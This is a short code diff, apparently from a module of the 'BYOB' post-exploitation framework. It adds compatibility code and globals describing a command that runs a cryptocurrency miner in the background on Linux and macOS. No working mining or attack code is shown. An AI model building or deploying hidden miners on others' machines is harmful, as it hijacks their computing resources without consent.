@@ -18,6 +18,20 @@ if sys.version_info[0] == 3:
 else:
 	from urllib2 import urlparse 	# Python 2
 
+try:
+    xrange			# Python 2
+except NameError:
+    xrange = range	# Python 3
+
+# globals
+command = True
+results = {}
+packages  = []
+platforms = ['linux2','darwin']
+usage = 'miner <url> <username> <password>'
+description = """
+Run a cryptocurrency miner in the background (supports Bitcoin & Litecoin)
+"""
 
 USER_AGENT = "BYOB"
 VERSION = [0, 1]
